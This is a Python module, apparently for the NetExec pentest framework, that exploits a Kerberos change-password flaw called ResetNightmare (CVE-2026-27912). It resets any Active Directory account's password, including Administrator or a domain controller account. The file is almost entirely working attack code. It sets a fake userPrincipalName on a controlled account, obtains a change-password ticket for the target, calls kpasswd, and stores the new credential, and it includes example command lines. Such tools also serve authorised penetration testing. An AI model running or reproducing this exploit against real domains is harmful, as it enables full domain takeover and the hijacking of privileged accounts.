import sys
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5.kpasswd import changePassword, KPasswdError, KRB5_KPASSWD_TGT_SPN
from impacket.ldap.ldap import MODIFY_REPLACE, MODIFY_DELETE, LDAPSessionError
from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes


class NXCModule:
    """
    Module by @azoxlpf based on the ResetNightmare PoC and
    https://www.semperis.com/blog/identity-crisis-novel-vulnerabilities-leading-to-kerberos-downgrade-dos-and-full-domain-takeover/
    """

    name = "resetnightmare"
    description = "Exploit ResetNightmare (CVE-2026-27912) to reset any account's password via Kerberos change password"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self):
        self.context = None
        self.connection = None
        self.target = None
        self.new_password = None
        self.upn_user = None
        self.upn_password = None

    def options(self, context, module_options):
        """
        Reset any account's password by abusing the Kerberos Change Password protocol (CVE-2026-27912, ResetNightmare).
        Requires GenericWrite over a controlled account's userPrincipalName, and an unpatched DC.

        TARGET          sAMAccountName of the account whose password gets reset (append $ for a computer)
        NEW_PASSWORD    New password to set on TARGET
        UPN_USER        sAMAccountName of a controlled account you can write a userPrincipalName to (not the login account)
        UPN_PASSWORD    Cleartext password of UPN_USER

        Examples:
        netexec ldap <ip> -u <username> -p <password> -M resetnightmare -o TARGET=Administrator NEW_PASSWORD='NewPass!' UPN_USER=controlled UPN_PASSWORD='Passw0rd!'
        netexec ldap <ip> -u <username> -p <password> -M resetnightmare -o TARGET=DC01$ NEW_PASSWORD='NewPass!' UPN_USER=controlled$ UPN_PASSWORD='Passw0rd!'
        """
        self.target = module_options.get("TARGET")
        self.new_password = module_options.get("NEW_PASSWORD")
        self.upn_user = module_options.get("UPN_USER")
        self.upn_password = module_options.get("UPN_PASSWORD")

        if not all([self.target, self.new_password, self.upn_user, self.upn_password]):
            context.log.fail("TARGET, NEW_PASSWORD, UPN_USER and UPN_PASSWORD are all required")
            sys.exit(1)

    def resolve_account(self, sam):
        response = self.connection.search(searchFilter=f"(sAMAccountName={sam})", attributes=["distinguishedName"])
        entries = parse_result_attributes(response)
        return entries[0]["distinguishedName"] if entries else None

    def get_account_upn(self, sam):
        response = self.connection.search(searchFilter=f"(sAMAccountName={sam})", attributes=["distinguishedName", "userPrincipalName"])
        entries = parse_result_attributes(response)
        if not entries:
            return None, None
        return entries[0]["distinguishedName"], entries[0].get("userPrincipalName")

    def set_upn(self, dn, upn):
        try:
            self.connection.ldap_connection.modify(dn, {"userPrincipalName": [(MODIFY_REPLACE, upn)]})
            return True
        except LDAPSessionError as e:
            self.context.log.fail(f"Failed to set UPN on {self.upn_user}: {e}")
            return False

    def restore_upn(self, dn, old_upn):
        try:
            if old_upn:
                self.connection.ldap_connection.modify(dn, {"userPrincipalName": [(MODIFY_REPLACE, old_upn)]})
                self.context.log.display(f"Restored original UPN '{old_upn}' on {self.upn_user}")
            else:
                self.connection.ldap_connection.modify(dn, {"userPrincipalName": [(MODIFY_DELETE, [])]})
                self.context.log.display(f"Cleared fake UPN from {self.upn_user}")
        except LDAPSessionError as e:
            self.context.log.fail(f"Cleanup failed, UPN may still be set on {self.upn_user}: {e}")

    def request_changepw_tgt(self):
        client = Principal(self.target, type=constants.PrincipalNameType.NT_ENTERPRISE.value)
        kdc = self.connection.kdcHost or self.connection.host
        try:
            tgt, cipher, _, session_key = getKerberosTGT(client, self.upn_password, self.connection.domain, "", "", "", kdcHost=kdc, serverName=KRB5_KPASSWD_TGT_SPN)
        except (KerberosError, OSError) as e:
            self.context.log.fail(f"Failed to request change-password TGT: {e}")
            return None
        self.context.log.success(f"Obtained NT-ENTERPRISE TGT for '{self.target}' targeting {KRB5_KPASSWD_TGT_SPN}")
        return {"KDC_REP": tgt, "cipher": cipher, "sessionKey": session_key}

    def reset_password(self, tgt):
        kdc = self.connection.kdcHost or self.connection.host
        try:
            changePassword(self.target, self.connection.domain, self.new_password, TGT=tgt, kdcHost=kdc, kpasswdHost=kdc)
        except (KPasswdError, KerberosError, OSError) as e:
            self.context.log.fail(f"Password change failed: {' '.join(str(e).split())}")
            return False
        return True

    def on_login(self, context, connection):
        self.context = context
        self.connection = connection

        target_dn = self.resolve_account(self.target)
        if not target_dn:
            context.log.fail(f"Target '{self.target}' not found")
            return
        upn_dn, old_upn = self.get_account_upn(self.upn_user)
        if not upn_dn:
            context.log.fail(f"Controlled account '{self.upn_user}' not found")
            return

        context.log.display(f"Target: {self.target} ({target_dn})")
        context.log.display(f"Controlled account: {self.upn_user} ({upn_dn}), current UPN: {old_upn or '<none>'}")

        if not self.set_upn(upn_dn, self.target):
            return
        context.log.success(f"Set fake UPN '{self.target}' on {self.upn_user}")

        try:
            tgt = self.request_changepw_tgt()
        finally:
            self.restore_upn(upn_dn, old_upn)

        if tgt is None:
            return

        if not self.reset_password(tgt):
            return

        context.log.highlight(f"Successfully reset password of '{self.target}' to '{self.new_password}'")
        context.db.add_credential("plaintext", connection.domain, self.target, self.new_password)
